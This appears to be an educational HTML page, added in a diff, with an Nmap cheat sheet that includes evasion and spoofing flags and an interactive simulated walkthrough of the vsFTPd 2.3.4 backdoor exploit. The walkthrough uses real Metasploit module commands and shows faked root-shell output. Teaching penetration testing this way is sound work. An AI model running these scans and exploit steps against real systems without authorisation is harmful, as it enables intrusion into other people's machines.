@@ -1,0 +1,646 @@
+<!DOCTYPE html>
+<html lang="en" class="scroll-smooth">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>NMAP Helper</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;700&family=Roboto+Mono:wght@400;700&display=swap" rel="stylesheet">
+    <!-- Chosen Palette: Warm Neutral Harmony -->
+    <!-- Application Structure Plan: The application is structured with three main tabs: "Nmap Command Center", "Example Exploit Walkthrough", and "About". This organization prioritizes the practical tool (Nmap) first, followed by the educational walkthrough, and concludes with author information. This flow is logical for users who may want to quickly access the command reference. The Nmap tab features an interactive command builder for immediate use, followed by a comprehensive, well-structured cheat sheet for in-depth research. The tabbed design maintains a clean single-page application feel while separating distinct functional areas. -->
+    <!-- Visualization & Content Choices: The procedural vsFTPd exploit is visualized using interactive simulated terminals (HTML/CSS) in its dedicated tab, ensuring no static graphics (NO SVG/Mermaid) are used. The Nmap command builder uses dynamic HTML generation from a JSON object for interactivity. The comprehensive Nmap cheat sheet, provided by the user, is now fully integrated using semantic HTML (headings, lists, code blocks) for maximum readability and accessibility, replacing the previous summary. The "About" section uses a simple, clean card layout. -->
+    <!-- CONFIRMATION: NO SVG graphics used. NO Mermaid JS used. -->
+    <style>
+        body {
+            font-family: 'Inter', sans-serif;
+            background-color: #FDFBF8;
+            color: #383838;
+        }
+        .font-mono {
+            font-family: 'Roboto Mono', monospace;
+        }
+        .terminal {
+            background-color: #1E1E1E;
+            color: #E0E0E0;
+            border-radius: 0.5rem;
+            padding: 1.5rem;
+            transition: opacity 0.5s ease-in-out, max-height 0.5s ease-in-out;
+            max-height: 0;
+            opacity: 0;
+            overflow: hidden;
+        }
+        .terminal.active {
+            max-height: 500px;
+            opacity: 1;
+        }
+        .terminal-line {
+            white-space: pre-wrap;
+        }
+        .terminal-prompt {
+            color: #4CAF50;
+        }
+        .terminal-highlight {
+            background-color: #A52A2A;
+            color: #FFFFFF;
+            padding: 0 4px;
+            border-radius: 2px;
+        }
+        .blinking-cursor {
+            animation: blink 1s step-end infinite;
+        }
+        @keyframes blink {
+            from, to { border-right-color: transparent; }
+            50% { border-right-color: #4CAF50; }
+        }
+        .tab-btn.active {
+            border-color: #F59E0B;
+            color: #D97706;
+            background-color: #FFFBEB;
+        }
+        .tab-content {
+            display: none;
+        }
+        .tab-content.active {
+            display: block;
+        }
+        .nmap-command {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            margin-bottom: 1rem;
+            background-color: #F9FAFB;
+            padding: 0.75rem 1rem;
+            border-radius: 0.5rem;
+            border: 1px solid #E5E7EB;
+        }
+        .nmap-command code {
+            font-family: 'Roboto Mono', monospace;
+            color: #1F2937;
+        }
+        .copy-btn {
+            background-color: #D1D5DB;
+            color: #1F2937;
+            border: none;
+            padding: 0.25rem 0.75rem;
+            cursor: pointer;
+            border-radius: 0.375rem;
+            font-size: 0.875rem;
+            transition: background-color 0.3s;
+        }
+        .copy-btn:hover {
+            background-color: #9CA3AF;
+        }
+        .cheatsheet-section code {
+            font-family: 'Roboto Mono', monospace;
+            background-color: #f3f4f6;
+            padding: 2px 5px;
+            border-radius: 4px;
+            color: #374151;
+        }
+    </style>
+</head>
+<body class="antialiased">
+
+    <header class="bg-white/80 backdrop-blur-lg sticky top-0 z-20 border-b border-gray-200">
+        <div class="max-w-6xl mx-auto px-4 sm:px-6 lg:px-8">
+            <div class="flex items-center justify-between h-16">
+                <div class="flex items-center">
+                    <span class="font-bold text-xl text-gray-800">Cyber Ops Center</span>
+                </div>
+            </div>
+        </div>
+    </header>
+
+    <main class="max-w-5xl mx-auto p-4 sm:p-6 lg:p-8">
+
+        <div class="mb-8 border-b border-gray-200">
+            <nav class="flex space-x-4" aria-label="Tabs">
+                <button id="tab-nmap-btn" class="tab-btn active whitespace-nowrap pb-4 px-1 border-b-2 font-medium text-sm">
+                    Nmap Command Center
+                </button>
+                <button id="tab-walkthrough-btn" class="tab-btn whitespace-nowrap pb-4 px-1 border-b-2 font-medium text-sm text-gray-500 hover:text-gray-700 hover:border-gray-300">
+                    Exploit Walkthrough
+                </button>
+                 <button id="tab-about-btn" class="tab-btn whitespace-nowrap pb-4 px-1 border-b-2 font-medium text-sm text-gray-500 hover:text-gray-700 hover:border-gray-300">
+                    About
+                </button>
+            </nav>
+        </div>
+
+        <!-- TAB 1: Nmap Command Center -->
+        <div id="tab-nmap-content" class="tab-content active">
+            <div class="text-center mb-12">
+                <h1 class="text-4xl md:text-5xl font-bold text-gray-900 mb-4">Nmap Command Center</h1>
+                <p class="text-lg text-gray-600 max-w-2xl mx-auto">
+                    Use the interactive builder to generate common commands, or browse the full cheat sheet for advanced options.
+                </p>
+            </div>
+
+            <section id="nmap-builder" class="mb-16">
+                <div class="bg-white p-8 rounded-lg shadow-sm border border-gray-200">
+                    <h2 class="text-2xl font-bold text-gray-900 mb-2">Command Builder</h2>
+                    <p class="text-gray-600 mb-6">Enter a target IP or hostname to generate ready-to-use commands.</p>
+                    <input type="text" id="target-ip" placeholder="Enter target IP (e.g., 192.168.1.1 or scanme.nmap.org)" class="w-full p-3 mb-4 border-2 border-gray-300 rounded-lg focus:ring-amber-500 focus:border-amber-500 font-mono">
+                    <div id="categories-container" class="flex flex-wrap gap-2 mb-6"></div>
+                    <div id="commands-container"></div>
+                </div>
+            </section>
+
+            <section id="nmap-cheatsheet">
+                 <div class="bg-white p-8 rounded-lg shadow-sm border border-gray-200 cheatsheet-section">
+                    <h2 class="text-3xl font-bold text-gray-900 mb-6">Nmap Cheat Sheet</h2>
+                    
+                    <div class="prose max-w-none prose-indigo">
+                        <p class="lead text-lg text-gray-600">This cheat sheet is crafted to assist both beginners and seasoned professionals in identifying vulnerabilities using Nmap. It covers fundamental knowledge for those new to penetration testing, while also providing advanced options to help experienced users refine their skills.</p>
+                        
+                        <h3 class="text-2xl font-semibold mt-8 mb-4">NMAP</h3>
+
+                        <div class="space-y-6">
+                            <div>
+                                <h4 class="text-xl font-semibold mb-3">Misc</h4>
+                                <ul class="list-disc list-inside space-y-2">
+                                    <li><code>-6</code>: Enable IPv6 scanning</li>
+                                    <li><code>-A</code>: Enable OS detection, version detection, script scanning, and traceroute</li>
+                                    <li><code>--datadir &lt;dirname&gt;</code>: Specify custom Nmap data file location</li>
+                                    <li><code>--send-eth/--send-ip</code>: Send using raw ethernet frames or IP packets</li>
+                                    <li><code>--privileged</code>: Assume the user is fully privileged</li>
+                                    <li><code>--unprivileged</code>: Assume the user lacks raw socket privileges</li>
+                                    <li><code>-V</code>: Print version number</li>
+                                    <li><code>-h</code>: Print this help summary page</li>
+                                </ul>
+                            </div>
+
+                            <div>
+                                <h4 class="text-xl font-semibold mb-3">Target Specification</h4>
+                                <ul class="list-disc list-inside space-y-2">
+                                    <li><code>-iL &lt;inputfilename&gt;</code>: Input from list of hosts/networks</li>
+                                    <li><code>-iR &lt;num hosts&gt;</code>: Choose random targets</li>
+                                    <li><code>--exclude &lt;host1,...&gt;</code>: Exclude hosts/networks</li>
+                                    <li><code>--excludefile &lt;exclude.file&gt;</code>: Exclude list from file</li>
+                                </ul>
+                            </div>
+
+                            <div>
+                                <h4 class="text-xl font-semibold mb-3">Host Discovery</h4>
+                                <ul class="list-disc list-inside space-y-2">
+                                    <li><code>-sL</code>: List Scan - simply list targets to scan</li>
+                                    <li><code>-sn</code>: Ping Scan - disable port scan</li>
+                                    <li><code>-Pn</code>: Treat all hosts as online - skip host discovery</li>
+                                    <li><code>-PS/PA/PU/PY</code>: TCP SYN/ACK, UDP, or SCTP discovery to given ports</li>
+                                    <li><code>-PE/PP/PM</code>: ICMP echo, timestamp, and netmask request discovery probes</li>
+                                    <li><code>-PO</code>: IP Protocol Ping</li>
+                                    <li><code>-n/-R</code>: Never do DNS resolution / Always resolve [default: sometimes]</li>
+                                    <li><code>--dns-servers &lt;serv1,...&gt;</code>: Specify custom DNS servers</li>
+                                    <li><code>--system-dns</code>: Use OS’s DNS resolver</li>
+                                    <li><code>--traceroute</code>: Trace hop path to each host</li>
+                                </ul>
+                            </div>
+
+                            <div>
+                                <h4 class="text-xl font-semibold mb-3">Scan Techniques</h4>
+                                <ul class="list-disc list-inside space-y-2">
+                                    <li><code>-sS/sT/sA/sW/sM</code>: TCP SYN/Connect()/ACK/Window/Maimon scans</li>
+                                    <li><code>-sU</code>: UDP Scan</li>
+                                    <li><code>-sN/sF/sX</code>: TCP Null, Fin, and Xmas scans</li>
+                                    <li><code>--scanflags &lt;flags&gt;</code>: Customize TCP scan flags</li>
+                                    <li><code>-sI &lt;zombie host[:probeport]&gt;</code>: Idle scan</li>
+                                    <li><code>-sY/sZ</code>: SCTP INIT/COOKIE-ECHO scans</li>
+                                    <li><code>-sO</code>: IP protocol scan</li>
+                                    <li><code>-b</code>: FTP relay host: FTP bounce scan</li>
+                                </ul>
+                            </div>
+
+                            <div>
+                                <h4 class="text-xl font-semibold mb-3">Port Specification & Scan Order</h4>
+                                <ul class="list-disc list-inside space-y-2">
+                                    <li><code>-p &lt;port ranges&gt;</code>: Only scan specified ports</li>
+                                    <li><code>--exclude-ports &lt;port ranges&gt;</code>: Exclude the specified ports from scanning</li>
+                                    <li><code>-F</code>: Fast mode - Scan fewer ports than the default scan</li>
+                                    <li><code>-r</code>: Scan ports sequentially - don’t randomize</li>
+                                    <li><code>--top-ports &lt;number&gt;</code>: Scan &lt;number&gt; most common ports</li>
+                                    <li><code>--port-ratio &lt;ratio&gt;</code>: Scan ports more common than &lt;ratio&gt;</li>
+                                </ul>
+                            </div>
+
+                            <div>
+                                <h4 class="text-xl font-semibold mb-3">Service/Version Detection</h4>
+                                <ul class="list-disc list-inside space-y-2">
+                                    <li><code>-sV</code>: Probe open ports to determine service/version info</li>
+                                    <li><code>--version-intensity &lt;level&gt;</code>: Set from 0 (light) to 9 (try all probes)</li>
+                                    <li><code>--version-light</code>: Limit to most likely probes (intensity 2)</li>
+                                    <li><code>--version-all</code>: Try every single probe (intensity 9)</li>
+                                    <li><code>--version-trace</code>: Show detailed version scan activity (for debugging)</li>
+                                </ul>
+                            </div>
+
+                            <div>
+                                <h4 class="text-xl font-semibold mb-3">Script Scan</h4>
+                                <ul class="list-disc list-inside space-y-2">
+                                    <li><code>-sC</code>: equivalent to --script=default</li>
+                                    <li><code>--script &lt;Lua scripts&gt;</code>: Lua scripts is a comma-separated list of directories, script files, or script categories.</li>
+                                    <li><code>--script-args=&lt;n1=v1,...&gt;</code>: Provide arguments to scripts</li>
+                                    <li><code>--script-args-file=filename</code>: Provide NSE script args in a file</li>
+                                    <li><code>--script-trace</code>: Show all data sent and received</li>
+                                    <li><code>--script-updatedb</code>: Update the script database.</li>
+                                    <li><code>--script-help &lt;Lua scripts&gt;</code>: Show help about scripts.</li>
+                                </ul>
+                            </div>
+
+                            <div>
+                                <h4 class="text-xl font-semibold mb-3">Timing & Performance</h4>
+                                <ul class="list-disc list-inside space-y-2">
+                                    <li><code>-T&lt;0-5&gt;</code>: Set timing template (higher is faster)</li>
+                                    <li><code>--min-hostgroup/max-hostgroup &lt;size&gt;</code>: Parallel host scan group sizes</li>
+                                    <li><code>--min-parallelism/max-parallelism &lt;numprobes&gt;</code>: Probe parallelization</li>
+                                    <li><code>--min-rtt-timeout/max-rtt-timeout/initial-rtt-timeout &lt;time&gt;</code>: Specifies probe round trip time.</li>
+                                    <li><code>--max-retries &lt;tries&gt;</code>: Caps number of port scan probe retransmissions.</li>
+                                    <li><code>--host-timeout &lt;time&gt;</code>: Give up on target after this long.</li>
+                                    <li><code>--scan-delay/--max-scan-delay &lt;time&gt;</code>: Adjust delay between probes</li>
+                                    <li><code>--min-rate &lt;number&gt;</code>: Send packets no slower than &lt;number&gt; per second</li>
+                                    <li><code>--max-rate &lt;number&gt;</code>: Send packets no faster than &lt;number&gt; per second</li>
+                                </ul>
+                            </div>
+
+                            <div>
+                                <h4 class="text-xl font-semibold mb-3">Firewall/IDS Evasion & Spoofing</h4>
+                                <ul class="list-disc list-inside space-y-2">
+                                    <li><code>-f</code>: Fragment packets (optionally w/given MTU)</li>
+                                    <li><code>-D &lt;decoy1,decoy2[,ME],...&gt;</code>: Cloak a scan with decoys</li>
+                                    <li><code>-S &lt;IP address&gt;</code>: Spoof source address</li>
+                                    <li><code>-e &lt;iface&gt;</code>: Use specified interface</li>
+                                    <li><code>-g/--source-port &lt;portnum&gt;</code>: Use given port number</li>
+                                    <li><code>--data-length &lt;num&gt;</code>: Append random data to sent packets</li>
+                                    <li><code>--spoof-mac &lt;mac address/prefix/vendor name&gt;</code>: Spoof your MAC address</li>
+                                </ul>
+                            </div>
+
+                            <div>
+                                <h4 class="text-xl font-semibold mb-3">Output</h4>
+                                <ul class="list-disc list-inside space-y-2">
+                                    <li><code>-oN/-oX/-oS/-oG &lt;file&gt;</code>: Output scan in normal, XML, s|ript kidd|3, and Grepable format.</li>
+                                    <li><code>-oA &lt;basename&gt;</code>: Output in the three major formats at once</li>
+                                    <li><code>-v</code>: Increase verbosity level (use -vv or more for greater effect)</li>
+                                    <li><code>-d</code>: Increase debugging level (use -dd or more for greater effect)</li>
+                                    <li><code>--reason</code>: Display the reason a port is in a particular state</li>
+                                    <li><code>--open</code>: Only show open (or possibly open) ports</li>
+                                    <li><code>--packet-trace</code>: Show all packets sent and received</li>
+                                    <li><code>--append-output</code>: Append to rather than clobber specified output files</li>
+                                </ul>
+                            </div>
+
+                            <div>
+                                <h4 class="text-xl font-semibold mb-3">OS Detection</h4>
+                                <ul class="list-disc list-inside space-y-2">
+                                    <li><code>-O</code>: Enable OS detection</li>
+                                    <li><code>--osscan-limit</code>: Limit OS detection to promising targets</li>
+                                    <li><code>--osscan-guess</code>: Guess OS more aggressively</li>
+                                </ul>
+                            </div>
+                        </div>
+
+                        <div class="mt-8 border-t pt-6">
+                            <p>This guide is designed to be useful to everyone in the field of cybersecurity.</p>
+                        </div>
+                    </div>
+                </div>
+            </section>
+        </div>
+        
+        <!-- TAB 2: Exploit Walkthrough -->
+        <div id="tab-walkthrough-content" class="tab-content">
+            <div class="text-center mb-16">
+                <h1 class="text-4xl md:text-5xl font-bold text-gray-900 mb-4">Anatomy of a Hack</h1>
+                <p class="text-lg text-gray-600 max-w-2xl mx-auto">
+                    An interactive walkthrough of the vsFTPd 2.3.4 exploit. Follow the steps to see how an attacker moves from discovery to complete system control.
+                </p>
+            </div>
+            <section id="phase1" class="mb-16">
+                <div class="flex items-center mb-6">
+                    <div class="flex-shrink-0 bg-rose-100 text-rose-800 w-12 h-12 rounded-full flex items-center justify-center">
+                        <span class="text-xl font-bold">1</span>
+                    </div>
+                    <div class="ml-4">
+                        <h2 class="text-3xl font-bold text-gray-900">Phase 1: Reconnaissance</h2>
+                        <p class="text-md text-gray-500">Finding a way in.</p>
+                    </div>
+                </div>
+                <div class="bg-white p-8 rounded-lg shadow-sm border border-gray-200">
+                    <p class="text-gray-700 leading-relaxed mb-6">
+                        The first step for any attacker is to survey the target. They use a tool called `nmap` to scan for open ports, which are like unlocked doors on a server. The goal is to find not just an open door, but one with a specific, known weakness. In this case, the scan identifies that the FTP service is running a very specific, vulnerable version: **vsFTPd 2.3.4**.
+                    </p>
+                    <button id="runScanBtn" class="w-full md:w-auto bg-rose-600 text-white font-bold py-3 px-6 rounded-lg hover:bg-rose-700 transition-colors duration-300">
+                        Simulate Nmap Scan
+                    </button>
+                    <div id="scanResult" class="terminal font-mono text-sm mt-6">
+                        <div class="terminal-line"><span class="terminal-prompt">$</span> nmap -sV -p 21 target-ip</div>
+                        <div class="terminal-line">Starting Nmap...</div>
+                        <div class="terminal-line">Nmap scan report for target-ip</div>
+                        <div class="terminal-line">Host is up (0.052s latency).</div>
+                        <div class="terminal-line">PORT&nbsp;&nbsp;&nbsp;STATE&nbsp;&nbsp;SERVICE&nbsp;&nbsp;VERSION</div>
+                        <div class="terminal-line">21/tcp&nbsp;&nbsp;<span class="text-green-400">open</span>&nbsp;&nbsp;&nbsp;ftp&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="terminal-highlight">vsFTPd 2.3.4</span></div>
+                        <div class="terminal-line">Service detection performed. Please report any incorrect results.</div>
+                        <div class="terminal-line">Nmap done.</div>
+                    </div>
+                </div>
+            </section>
+            <section id="phase2" class="mb-16">
+                <div class="flex items-center mb-6">
+                    <div class="flex-shrink-0 bg-amber-100 text-amber-800 w-12 h-12 rounded-full flex items-center justify-center">
+                        <span class="text-xl font-bold">2</span>
+                    </div>
+                    <div class="ml-4">
+                        <h2 class="text-3xl font-bold text-gray-900">Phase 2: Verification</h2>
+                        <p class="text-md text-gray-500">Making sure the key fits the lock.</p>
+                    </div>
+                </div>
+                <div class="bg-white p-8 rounded-lg shadow-sm border border-gray-200">
+                    <p class="text-gray-700 leading-relaxed mb-6">
+                        Finding a vulnerable version is a good sign, but a smart attacker confirms the weakness before launching a full attack. They use `nmap`'s scripting engine (`--script vuln`) to run a specific check for the vsFTPd 2.3.4 backdoor. The script sends a special command; if the server responds by opening a secret command shell, the vulnerability is confirmed.
+                    </p>
+                    <button id="runVulnBtn" class="w-full md:w-auto bg-amber-500 text-white font-bold py-3 px-6 rounded-lg hover:bg-amber-600 transition-colors duration-300">
+                        Simulate Vulnerability Check
+                    </button>
+                    <div id="vulnResult" class="terminal font-mono text-sm mt-6">
+                        <div class="terminal-line"><span class="terminal-prompt">$</span> nmap --script ftp-vsftpd-backdoor -p 21 target-ip</div>
+                        <div class="terminal-line">Starting Nmap...</div>
+                        <div class="terminal-line">Host script results:</div>
+                        <div class="terminal-line">| ftp-vsftpd-backdoor:</div>
+                        <div class="terminal-line">|&nbsp;&nbsp;&nbsp;<span class="terminal-highlight">VULNERABLE:</span></div>
+                        <div class="terminal-line">|&nbsp;&nbsp;&nbsp;vsFTPd version 2.3.4 contains a backdoor that allows remote command execution.</div>
+                        <div class="terminal-line">|_&nbsp;&nbsp; Shell listening on port 6200.</div>
+                        <div class="terminal-line">Nmap done.</div>
+                    </div>
+                </div>
+            </section>
+            <section id="phase3" class="mb-16">
+                <div class="flex items-center mb-6">
+                    <div class="flex-shrink-0 bg-sky-100 text-sky-800 w-12 h-12 rounded-full flex items-center justify-center">
+                        <span class="text-xl font-bold">3</span>
+                    </div>
+                    <div class="ml-4">
+                        <h2 class="text-3xl font-bold text-gray-900">Phase 3: Exploitation</h2>
+                        <p class="text-md text-gray-500">Turning the key.</p>
+                    </div>
+                </div>
+                <div class="bg-white p-8 rounded-lg shadow-sm border border-gray-200">
+                    <p class="text-gray-700 leading-relaxed mb-6">
+                        With the target confirmed, the attacker uses the Metasploit Framework, a powerful toolkit for penetration testing. They load the specific exploit for the vsFTPd backdoor, set the target's IP address (`RHOSTS`), and run the attack. Metasploit handles all the complexities, sending the precise payload needed to trigger the backdoor.
+                    </p>
+                    <div id="metasploitConsole" class="terminal font-mono text-sm mb-6 active" style="max-height: 500px; opacity: 1;">
+                        <div id="msfContent">
+                            <div class="terminal-line">Starting the Metasploit Framework console...</div>
+                        </div>
+                    </div>
+                     <div class="flex flex-wrap gap-4">
+                        <button id="msfStep1" class="flex-grow md:flex-grow-0 bg-sky-600 text-white font-bold py-3 px-6 rounded-lg hover:bg-sky-700 transition-colors duration-300">1. Load Exploit</button>
+                        <button id="msfStep2" class="flex-grow md:flex-grow-0 bg-gray-400 text-white font-bold py-3 px-6 rounded-lg cursor-not-allowed" disabled>2. Set Target</button>
+                        <button id="msfStep3" class="flex-grow md:flex-grow-0 bg-gray-400 text-white font-bold py-3 px-6 rounded-lg cursor-not-allowed" disabled>3. Run Exploit</button>
+                    </div>
+                </div>
+            </section>
+            <section id="phase4" class="mb-16">
+                <div class="flex items-center mb-6">
+                    <div class="flex-shrink-0 bg-green-100 text-green-800 w-12 h-12 rounded-full flex items-center justify-center">
+                        <span class="text-xl font-bold">4</span>
+                    </div>
+                    <div class="ml-4">
+                        <h2 class="text-3xl font-bold text-gray-900">Phase 4: Total Control</h2>
+                        <p class="text-md text-gray-500">Owning the system.</p>
+                    </div>
+                </div>
+                <div class="bg-white p-8 rounded-lg shadow-sm border border-gray-200">
+                    <p class="text-gray-700 leading-relaxed mb-6">
+                        The exploit is successful. The backdoor on the target server opens a command shell and connects it back to the attacker. Because the FTP service often runs with high privileges, this shell is a **root shell**—the highest level of access. The attacker now has complete control over the machine, able to read any file, install malicious software, or use it to launch further attacks. The system is compromised.
+                    </p>
+                    <div id="rootShell" class="terminal font-mono text-sm">
+                        <div class="terminal-line">Command shell session 1 opened (attacker-ip:4444 -> target-ip:6200)</div>
+                        <div class="terminal-line">&nbsp;</div>
+                        <div class="terminal-line"><span class="text-red-500">root@target</span>:<span class="text-blue-400">~</span># ls -la</div>
+                        <div class="terminal-line">total 60</div>
+                        <div class="terminal-line">drwx------ 10 root root 4096 Jul 30 11:50 .</div>
+                        <div class="terminal-line">drwxr-xr-x 18 root root 4096 Jul 28 10:00 ..</div>
+                        <div class="terminal-line">-rw-------  1 root root 5444 Jul 30 11:50 .bash_history</div>
+                        <div class="terminal-line">-rw-r--r--  1 root root 3106 Oct 22  2015 .bashrc</div>
+                        <div class="terminal-line">drwx------  2 root root 4096 May 15 14:02 .ssh</div>
+                        <div class="terminal-line"><span class="text-red-500">root@target</span>:<span class="text-blue-400">~</span># whoami</div>
+                        <div class="terminal-line">root</div>
+                        <div class="terminal-line"><span class="text-red-500">root@target</span>:<span class="text-blue-400">~</span># <span class="blinking-cursor"></span></div>
+                    </div>
+                </div>
+            </section>
+        </div>
+
+        <!-- TAB 3: About -->
+        <div id="tab-about-content" class="tab-content">
+            <div class="bg-white p-8 rounded-lg shadow-sm border border-gray-200">
+                <h1 class="text-3xl font-bold text-gray-900 mb-6 text-center">About the Author</h1>
+                <div class="max-w-md mx-auto">
+                    <div class="flex flex-col items-center">
+                         <img class="w-32 h-32 rounded-full mb-4" src="https://media.licdn.com/dms/image/v2/D5603AQH7dVmFQe87qw/profile-displayphoto-scale_400_400/B56ZeySvuBGQAo-/0/1751042949847?e=1756944000&v=beta&t=kC4IZ2Ab7Ma6tCwynvCLaS-LG7G9WkUlFFi3_BcNiN4" alt="Profile Picture">
+                         <h2 class="text-2xl font-semibold text-gray-800">Kuppam Johari</h2>
+                         <p class="text-gray-600">Cybersecurity Analyst & Developer</p>
+                         <div class="mt-4 text-center text-gray-700">
+                             <p>This interactive tool was created to provide a hands-on learning experience for cybersecurity concepts. Feel free to connect!</p>
+                         </div>
+                         <div class="mt-6 flex space-x-4">
+                             <a href="https://kuppamjohari.io" target="_blank" class="text-gray-500 hover:text-gray-800">
+                                 <svg class="w-6 h-6" fill="currentColor" viewBox="0 0 24 24" aria-hidden="true"><path fill-rule="evenodd" d="M12 2C6.477 2 2 6.477 2 12c0 4.418 2.865 8.168 6.839 9.49.5.092.682-.217.682-.482 0-.237-.009-.868-.014-1.703-2.782.605-3.369-1.343-3.369-1.343-.454-1.158-1.11-1.466-1.11-1.466-.908-.62.069-.608.069-.608 1.003.07 1.531 1.032 1.531 1.032.892 1.53 2.341 1.088 2.91.832.092-.647.35-1.088.636-1.338-2.22-.253-4.555-1.113-4.555-4.951 0-1.093.39-1.988 1.031-2.688-.103-.253-.446-1.272.098-2.65 0 0 .84-.27 2.75 1.026A9.564 9.564 0 0112 6.844c.85.004 1.705.115 2.504.337 1.909-1.296 2.747-1.027 2.747-1.027.546 1.378.203 2.398.1 2.651.64.7 1.03 1.595 1.03 2.688 0 3.848-2.338 4.695-4.566 4.943.359.309.678.92.678 1.855 0 1.338-.012 2.419-.012 2.747 0 .268.18.58.688.482A10.001 10.001 0 0022 12c0-5.523-4.477-10-10-10z" clip-rule="evenodd" /></svg>
+                             </a>
+                             <a href="https://www.linkedin.com/in/kuppamjohari/" target="_blank" class="text-gray-500 hover:text-gray-800">
+                                 <svg class="w-6 h-6" fill="currentColor" viewBox="0 0 24 24" aria-hidden="true"><path d="M19 0h-14c-2.761 0-5 2.239-5 5v14c0 2.761 2.239 5 5 5h14c2.762 0 5-2.239 5-5v-14c0-2.761-2.238-5-5-5zm-11 19h-3v-11h3v11zm-1.5-12.268c-.966 0-1.75-.79-1.75-1.764s.784-1.764 1.75-1.764 1.75.79 1.75 1.764-.783 1.764-1.75 1.764zm13.5 12.268h-3v-5.604c0-3.368-4-3.113-4 0v5.604h-3v-11h3v1.765c1.396-2.586 7-2.777 7 2.476v6.759z"/></svg>
+                             </a>
+                         </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+    </main>
+
+    <script>
+        document.addEventListener('DOMContentLoaded', function() {
+            // --- DATA ---
+            const nmapCommandsData = [
+                {"command": "nmap <target>","description": "Basic scan of a target.","category": "Basic Scans"},
+                {"command": "nmap <target1> <target2>","description": "Scan multiple targets.","category": "Basic Scans"},
+                {"command": "nmap 192.168.1.1-50","description": "Scan a range of IPs.","category": "Basic Scans"},
+                {"command": "nmap 192.168.1.0/24","description": "Scan an entire subnet.","category": "Basic Scans"},
+                {"command": "nmap -p 22,80,443 <target>","description": "Scan specific ports.","category": "Port Scans"},
+                {"command": "nmap -p- <target>","description": "Scan all ports.","category": "Port Scans"},
+                {"command": "nmap --top-ports 10 <target>","description": "Scan the top 10 most common ports.","category": "Port Scans"},
+                {"command": "nmap -sS <target>","description": "Perform a SYN scan (stealth).","category": "Advanced Scans"},
+                {"command": "nmap -sT <target>","description": "Perform a TCP connect scan (full connection).","category": "Advanced Scans"},
+                {"command": "nmap -sU <target>","description": "Perform a UDP scan.","category": "Advanced Scans"},
+                {"command": "nmap -A <target>","description": "Aggressive scan with OS and service detection.","category": "Advanced Scans"},
+                {"command": "nmap -Pn <target>","description": "Disable host discovery (ping).","category": "Advanced Scans"},
+                {"command": "nmap -sn <target>","description": "Perform a ping scan to determine if hosts are alive.","category": "Advanced Scans"},
+                {"command": "nmap <target> -oN output.txt","description": "Save output in normal format.","category": "Output Options"},
+                {"command": "nmap <target> -oX output.xml","description": "Save output in XML format.","category": "Output Options"},
+                {"command": "nmap <target> -oG output.gnmap","description": "Save output in grepable format.","category": "Output Options"},
+                {"command": "nmap --script vuln <target>","description": "Run vulnerability detection scripts.","category": "Script Usage"},
+                {"command": "nmap --script=http-* <target>","description": "Run HTTP-related scripts.","category": "Script Usage"},
+                {"command": "nmap -sC <target>","description": "Run default category scripts.","category": "Script Usage"},
+                {"command": "nmap -T4 <target>","description": "Adjust scan speed (Aggressive).","category": "Miscellaneous"},
+                {"command": "nmap --traceroute <target>","description": "Perform traceroute to determine the route.","category": "Miscellaneous"},
+                {"command": "nmap --spoof-mac <MAC>","description": "Spoof the MAC address.","category": "Miscellaneous"}
+            ];
+
+            // --- TAB HANDLING ---
+            const tabNmapBtn = document.getElementById('tab-nmap-btn');
+            const tabWalkthroughBtn = document.getElementById('tab-walkthrough-btn');
+            const tabAboutBtn = document.getElementById('tab-about-btn');
+            
+            const tabNmapContent = document.getElementById('tab-nmap-content');
+            const tabWalkthroughContent = document.getElementById('tab-walkthrough-content');
+            const tabAboutContent = document.getElementById('tab-about-content');
+
+            const tabs = [
+                { btn: tabNmapBtn, content: tabNmapContent },
+                { btn: tabWalkthroughBtn, content: tabWalkthroughContent },
+                { btn: tabAboutBtn, content: tabAboutContent }
+            ];
+
+            function switchTab(clickedTab) {
+                tabs.forEach(tab => {
+                    const isActive = tab.btn === clickedTab.btn;
+                    tab.btn.classList.toggle('active', isActive);
+                    tab.content.classList.toggle('active', isActive);
+                });
+            }
+
+            tabs.forEach(tab => {
+                tab.btn.addEventListener('click', () => switchTab(tab));
+            });
+
+            // --- EXPLOIT WALKTHROUGH SCRIPT ---
+            const runScanBtn = document.getElementById('runScanBtn');
+            const scanResult = document.getElementById('scanResult');
+            const runVulnBtn = document.getElementById('runVulnBtn');
+            const vulnResult = document.getElementById('vulnResult');
+            const rootShell = document.getElementById('rootShell');
+
+            runScanBtn.addEventListener('click', () => scanResult.classList.toggle('active'));
+            runVulnBtn.addEventListener('click', () => vulnResult.classList.toggle('active'));
+
+            const msfContent = document.getElementById('msfContent');
+            const msfStep1 = document.getElementById('msfStep1');
+            const msfStep2 = document.getElementById('msfStep2');
+            const msfStep3 = document.getElementById('msfStep3');
+
+            const appendToMsf = (text) => {
+                const line = document.createElement('div');
+                line.className = 'terminal-line';
+                line.innerHTML = text;
+                msfContent.appendChild(line);
+                msfContent.scrollTop = msfContent.scrollHeight;
+            };
+
+            msfStep1.addEventListener('click', () => {
+                appendToMsf('<span class="terminal-prompt">msf6 ></span> use exploit/unix/ftp/vsftpd_234_backdoor');
+                appendToMsf('exploit(unix/ftp/vsftpd_234_backdoor) <span class="terminal-prompt">></span> ');
+                msfStep1.disabled = true;
+                msfStep1.classList.add('bg-gray-400', 'cursor-not-allowed');
+                msfStep1.classList.remove('bg-sky-600', 'hover:bg-sky-700');
+                msfStep2.disabled = false;
+                msfStep2.classList.remove('bg-gray-400', 'cursor-not-allowed');
+                msfStep2.classList.add('bg-sky-600', 'hover:bg-sky-700');
+            });
+
+            msfStep2.addEventListener('click', () => {
+                appendToMsf('exploit(unix/ftp/vsftpd_234_backdoor) <span class="terminal-prompt">></span> set RHOSTS target-ip');
+                appendToMsf('RHOSTS => target-ip');
+                appendToMsf('exploit(unix/ftp/vsftpd_234_backdoor) <span class="terminal-prompt">></span> ');
+                msfStep2.disabled = true;
+                msfStep2.classList.add('bg-gray-400', 'cursor-not-allowed');
+                msfStep2.classList.remove('bg-sky-600', 'hover:bg-sky-700');
+                msfStep3.disabled = false;
